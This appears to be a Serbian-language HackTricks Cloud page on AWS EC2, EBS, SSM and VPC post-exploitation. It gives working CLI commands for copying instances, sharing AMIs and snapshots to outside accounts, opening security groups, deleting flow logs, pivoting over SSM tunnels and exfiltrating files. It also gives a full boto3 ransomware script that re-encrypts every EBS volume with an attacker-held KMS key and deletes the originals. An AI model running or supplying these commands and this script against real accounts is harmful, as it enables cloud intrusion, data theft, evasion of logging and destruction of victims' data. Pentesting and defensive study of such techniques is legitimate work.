# AWS - EC2, EBS, SSM & VPC Post-eksploatacija

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Za više informacija pogledajte:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplikuje dolazni i odlazni saobraćaj za EC2 instance unutar VPC-a** bez potrebe da se bilo šta instalira na samim instancama. Ovaj duplirani saobraćaj se obično šalje nečemu poput network intrusion detection system (IDS) za analizu i nadzor.  
Napadač bi mogao da to zloupotrebi da presretne sav saobraćaj i izvuče osetljive informacije iz njega:

Za više informacija pogledajte ovu stranicu:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instance obično sadrže neku vrstu osetljivih informacija. Postoje različiti načini da se uđe (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Međutim, drugi način da se proveri šta sadrže je da se **kreira AMI i pokrene nova instance (čak i na vašem nalogu) iz nje**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots su rezervne kopije volumena**, koje obično sadrže **osetljive informacije**, zato njihova provera treba da otkrije te informacije.\
Ako nađete **volume bez snapshot-a** možete: **napraviti snapshot** i izvršiti sledeće radnje ili jednostavno **montirati ga na instancu** unutar naloga:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Izvezite EC2 AMI direktno u S3 koristeći `CreateStoreImageTask` da biste dobili raw disk image bez deljenja snapshot-a. Ovo omogućava potpunu offline forenziku ili krađu podataka dok se mreža instance ostavlja netaknutom.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Prikačite io1/io2 Multi-Attach volume na drugu instancu i montirajte ga samo za čitanje da biste izvukli podatke u realnom vremenu bez snapshot-ova. Korisno kada ciljani volume već ima Multi-Attach omogućen u istoj AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Kreirajte EC2 Instance Connect Endpoint, dozvolite ingress i ubacite privremene SSH ključeve da pristupite privatnim instancama preko upravljanog tunela. Omogućava brze lateralne puteve bez otvaranja javnih portova.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Prebacite sekundarnu privatnu IP adresu žrtvinog ENI-ja na ENI pod kontrolom napadača da biste se predstavljali kao poverljivi hostovi koji su dozvoljeni po IP adresi. Omogućava zaobilaženje internih ACL-ova ili SG pravila vezanih za određene adrese.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Ponovo povežite Elastic IP sa instance žrtve na napadača da presretnete dolazni saobraćaj ili inicirate odlazne konekcije koje izgledaju da dolaze sa poverljivih javnih IP-ova.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Ako pravilo security group-a referencira customer-managed prefix list, dodavanjem attacker CIDR-ova u tu listu se tiho proširuje pristup kroz svako zavisno SG pravilo bez izmene samog SG-a.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Kreirajte gateway ili interface VPC endpoints da povratite outbound pristup iz izolovanih subnet-a. Iskorišćavanje AWS-managed private links zaobilazi nedostajuće IGW/NAT kontrole za data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Napadač sa permisijom ec2:AuthorizeSecurityGroupIngress može dodavati inbound pravila u security groups (na primer, dozvoljavajući tcp:80 iz 0.0.0.0/0), čime izlaže interne servise javnom Internetu ili drugim neautorizovanim mrežama.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Napadač sa ec2:ReplaceNetworkAclEntry (ili sličnim) dozvolama može izmeniti Network ACLs (NACLs) subnet-a da ih učini veoma permisivnim — na primer dozvoljavanjem 0.0.0.0/0 na kritičnim portovima — izlažući ceo opseg subnet-a Internetu ili neautorizovanim mrežnim segmentima. Za razliku od Security Groups, koje se primenjuju po instanci, NACLs se primenjuju na nivou subnet-a, tako da promena restriktivnog NACL-a može imati mnogo veći blast radius omogućavanjem pristupa mnogo većem broju hosts.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Napadač koji ima dozvole ec2:Delete* i iam:Remove* može izbrisati kritične infrastrukturne resurse i konfiguracije — na primer key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Ovo može izazvati trenutni prekid servisa, gubitak podataka i gubitak forenzičkih dokaza.

Jedan primer je brisanje security group-a:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Usmerite VPC Flow Logs u attacker-controlled S3 bucket da kontinuirano prikupljate mrežne metapodatke (source/destination, ports) izvan victim account-a za long-term reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Čak i ako zaključate EC2 tako da nijedan saobraćaj ne može da izađe, on i dalje može **exfil via DNS**.

- **VPC Flow Logs neće to zabeležiti**.
- Nemate pristup AWS DNS logovima.
- Onemogućite ovo podešavanjem "enableDnsSupport" na false pomoću:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Napadač može pozivati API endpoints naloga kojim on upravlja. Cloudtrail će zabeležiti ove pozive i napadač će moći da vidi exfiltrated podatke u Cloudtrail logovima.

### Open Security Group

Možete dobiti dodatni pristup mrežnim servisima otvaranjem portova ovako:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Moguće je pokrenuti EC2 instancu i registrovati je da bi se koristila za pokretanje ECS instanci, a zatim ukrasti podatke tih ECS instanci.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Zahtevane dozvole:

- `ssm:StartSession`

Pored izvršavanja komandi, SSM omogućava traffic tunneling koji se može zloupotrebiti za pivoting sa EC2 instanci koje nemaju mrežni pristup zbog Security Groups ili NACLs.
Jedan od scenarija gde je ovo korisno je pivoting sa [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) na privatni EKS cluster.

> Da biste započeli sesiju, potrebno je da imate instaliran SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Instalirajte SessionManagerPlugin na vašem računaru
2. Prijavite se na Bastion EC2 koristeći sledeću komandu:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Dobijte Bastion EC2 AWS temporary credentials pomoću [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. Prebacite credentials na sopstvenu mašinu u fajl `$HOME/.aws/credentials` kao profil `[bastion-ec2]`
5. Prijavite se na EKS kao Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ažurirajte polje `server` u fajlu `$HOME/.kube/config` da pokazuje na `https://localhost`
7. Kreirajte SSM tunel na sledeći način:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Saobraćaj alata `kubectl` sada se prosleđuje kroz SSM tunnel preko Bastion EC2 i možete pristupiti privatnom EKS klasteru sa svoje mašine pokretanjem:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Imajte na umu da će SSL konekcije propasti osim ako ne postavite zastavicu `--insecure-skip-tls-verify ` (ili njen ekvivalent u K8s audit alatima). Pošto se saobraćaj tuneluje kroz siguran AWS SSM tunel, zaštićeni ste od bilo kakvih MitM napada.

Na kraju, ova tehnika nije specifična za napad na privatne EKS klastere. Možete podesiti proizvoljne domene i portove da pivotujete na bilo koju drugu AWS uslugu ili prilagođenu aplikaciju.

---

#### Brzo lokalno ↔️ udaljeno Port Forward (AWS-StartPortForwardingSession)

Ako vam je potrebno da prosledite samo **jedan TCP port sa EC2 instance na vaš lokalni host** možete koristiti `AWS-StartPortForwardingSession` SSM dokument (nije potreban parametar remote host):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Komanda uspostavlja dvosmerni tunel između vaše radne stanice (`localPortNumber`) i izabranog porta (`portNumber`) na instanci **bez otvaranja bilo kojih inbound Security-Group pravila**.

Uobičajeni slučajevi upotrebe:

* **File exfiltration**
1. Na instanci pokrenite jednostavan HTTP server koji pokazuje na direktorijum koji želite da eksfiltrujete:

```bash
python3 -m http.server 8000
```

2. Sa vaše radne stanice preuzmite fajlove preko SSM tunela:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Pristup internim web aplikacijama (npr. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Savet: Sažmite i enkriptujte dokaze pre nego što ih eksfiltrirate, kako CloudTrail ne bi zabeležio clear-text sadržaj:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Deljenje AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Pretraživanje osetljivih informacija u javnim i privatnim AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel je alat dizajniran da **pretražuje osetljive informacije unutar javnih i privatnih Amazon Machine Images (AMIs)**. Automatizuje proces pokretanja instanci iz ciljnih AMIs, montiranja njihovih volumena i skeniranja potencijalnih secrets ili osetljivih podataka.

### Deljenje EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Proof of concept sličan Ransomware demonstraciji prikazanoj u S3 post-exploitation beleškama. KMS bi trebalo preimenovati u RMS za Ransomware Management Service s obzirom na to koliko je lako koristiti ga za enkriptovanje različitih AWS servisa.

Prvo, iz 'attacker' AWS account-a, kreirajte customer managed key u KMS. Za ovaj primer pustiću da AWS upravlja podacima ključa, ali u realističnom scenariju zlonamerni akter bi zadržao podatke ključa van kontrole AWS-a. Promenite key policy da dozvoli da bilo koji AWS account Principal koristi ključ. Za ovu key policy, ime account-a je bilo 'AttackSim', a policy pravilo koje dozvoljava kompletan pristup zove se 'Outside Encryption'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Pravilo u key policy mora imati omogućeno sledeće da bi moglo da se koristi za enkriptovanje EBS volumena:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Sada, kada imamo javno dostupan key za korišćenje. Možemo koristiti 'žrtva' nalog koji ima neke EC2 instance pokrenute sa prikačenim nekriptovanim EBS volumenima. EBS volumeni na tom 'žrtva' nalogu su cilj enkripcije; ovaj napad se izvodi pod pretpostavkom kompromitovanja AWS naloga sa visokim privilegijama.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Slično primeru S3 ransomware. Ovaj napad će napraviti kopije prikačenih EBS volumena koristeći snapshots, iskoristiti javno dostupan key iz 'napadač' naloga da enkriptuje nove EBS volumene, zatim otkačiti originalne EBS volumene sa EC2 instanci i izbrisati ih, i na kraju obrisati snapshots korišćene za kreiranje novo enkriptovanih EBS volumena. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Rezultat je da u nalogu ostanu samo enkriptovani EBS volumeni.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Takođe, vredno je napomenuti da je skripta zaustavila EC2 instance da bi otkačila i izbrisala originalne EBS volumene. Originalni nekriptovani volumeni su sada nestali.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Zatim se vratite na key policy u 'napadač' nalogu i uklonite 'Outside Encryption' policy rule iz key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Sačekajte trenutak da novo postavljena politika ključa (key policy) propagira. Zatim se vratite na 'victim' nalog i pokušajte da prikačite jedan od novo enkriptovanih EBS volumena. Videćete da možete da prikačite volumen.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Međutim, kada pokušate zapravo da pokrenete EC2 instancu sa enkriptovanim EBS volumenom, to će propasti i instanca će preći iz 'pending' stanja nazad u 'stopped' stanje zauvek, jer prikačeni EBS volumen ne može da se dešifruje pomoću ključa pošto politika ključa više to ne dozvoljava.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Ovo je python skripta koja se koristi. Preuzima AWS kredencijale za 'victim' nalog i javno dostupnu AWS ARN vrednost ključa koji će se koristiti za enkripciju. Skripta će napraviti enkriptovane kopije SVIH dostupnih EBS volumena prikačenih na SVE EC2 instance u ciljanom AWS nalogu, zatim zaustaviti svaku EC2 instancu, odvojiti originalne EBS volumene, obrisati ih i na kraju obrisati sve snapshots korišćene tokom procesa. To će ostaviti samo enkriptovane EBS volumene u ciljanom 'victim' nalogu. KORISTITE OVU SKRIPTU SAMO U TEST OKRUŽENJU, ONA JE DESTRUKTIVNA I OBRISAĆE SVE ORIGINALNE EBS VOLUMENE. Možete ih povratiti koristeći korišćeni KMS ključ i obnoviti ih u prvobitno stanje putem snapshots, ali samo želim da vas upozorim da je ovo na kraju dana ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Izvori

- [Pentest Partners – Kako prebaciti fajlove u AWS koristeći SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
